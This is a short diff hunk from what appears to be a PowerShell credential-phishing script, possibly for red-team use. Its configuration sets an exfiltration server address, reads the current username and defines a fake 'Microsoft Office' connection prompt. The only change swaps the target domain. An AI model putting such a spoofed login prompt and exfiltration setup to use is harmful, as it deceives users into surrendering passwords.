@@ -28,7 +28,7 @@ $exfilServer = "172.24.145.35"
 
 # prompt
 $targetUser = $env:username
-$companyEmail = "stark.local"
+$companyEmail = "umbrella.corp"
 $promptCaption = "Microsoft Office"
 $promptMessage = "Connecting to: $targetUser@$companyEmail"
 $maxTries = 1 # maximum number of times to invoke prompt
